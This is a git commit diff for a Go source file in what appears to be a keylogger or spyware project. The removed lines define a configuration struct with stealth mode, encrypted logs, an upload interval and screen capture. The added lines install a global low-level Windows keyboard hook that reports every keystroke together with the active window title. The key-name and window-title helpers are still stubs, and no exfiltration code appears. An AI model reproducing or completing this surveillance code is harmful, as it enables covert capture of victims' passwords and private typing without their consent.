ad8afd5dc0d33efc21d75a44aaaee0ef3533b9ba
Aravindan S <aravindan.s.offcl@gmail.com>
2025-07-09 20:19:45 +0530

    Update hook_windows.go

--- pkg/hook/hook_windows.go
+++ pkg/hook/hook_windows.go
@@ -1,17 +1,104 @@
-package config
+package hook
 
-type Config struct {
-	EncryptLogs     bool `json:"encrypt_logs"`
-	UploadInterval  int  `json:"upload_interval"`
-	StealthMode     bool `json:"stealth_mode"`
-	CaptureScreens  bool `json:"capture_screens"`
+import (
+	"syscall"
+	"unsafe"
+)
+
+var (
+	user32                  = syscall.NewLazyDLL("user32.dll")
+	setWindowsHookEx        = user32.NewProc("SetWindowsHookExW")
+	callNextHookEx          = user32.NewProc("CallNextHookEx")
+	unhookWindowsHookEx     = user32.NewProc("UnhookWindowsHookEx")
+	getMessageW             = user32.NewProc("GetMessageW")
+	getForegroundWindow     = user32.NewProc("GetForegroundWindow")
+	getWindowTextW          = user32.NewProc("GetWindowTextW")
+	getWindowTextLengthW    = user32.NewProc("GetWindowTextLengthW")
+)
+
+const (
+	WH_KEYBOARD_LL = 13
+	WM_KEYDOWN     = 0x0100
+	WM_SYSKEYDOWN  = 0x0104
+)
+
+type (
+	HOOKPROC  func(int, uintptr, uintptr) uintptr
+	KBDLLHOOKSTRUCT struct {
+		VkCode      uint32
+		ScanCode    uint32
+		Flags       uint32
+		Time        uint32
+		DwExtraInfo uintptr
+	}
+)
+
+var (
+	keyboardHook uintptr
+	keyCallback  func(string, string)
+)
+
+func Start(callback func(string, string)) error {
+	keyCallback = callback
+	hookProc := syscall.NewCallback(keyboardHookProc)
+
+	r, _, err := setWindowsHookEx.Call(
+		WH_KEYBOARD_LL,
+		hookProc,
+		0,
+		0,
+	)
+	if r == 0 {
+		return err
+	}
+	keyboardHook = r
+
+	go messageLoop()
+
+	return nil
 }
 
-func Load() *Config {
-	return &Config{
-		EncryptLogs:    true,
-		UploadInterval: 60,
-		StealthMode:    true,
-		CaptureScreens: false,
+func Stop() {
+	if keyboardHook != 0 {
+		unhookWindowsHookEx.Call(keyboardHook)
+		keyboardHook = 0
 	}
+}
+
+func keyboardHookProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
+	if nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+		kbdStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
+		keyName := getKeyName(kbdStruct.VkCode)
+		windowTitle := getActiveWindowTitle()
+		keyCallback(keyName, windowTitle)
+	}
+
+	r, _, _ := callNextHookEx.Call(keyboardHook, uintptr(nCode), wParam, lParam)
+	return r
+}
+
+func messageLoop() {
+	var msg struct {
+		HWnd    uintptr
+		Message uint32
+		WParam  uintptr
+		LParam  uintptr
+		Time    uint32
+		Pt      struct{ X, Y int32 }
+	}
+	
+	for {
+		ret, _, _ := getMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
+		if ret == 0 {
+			break
+		}
+	}
+}
+
+func getKeyName(vkCode uint32) string {
+	return "Key"
+}
+
+func getActiveWindowTitle() string {
+	return "Window"
 }
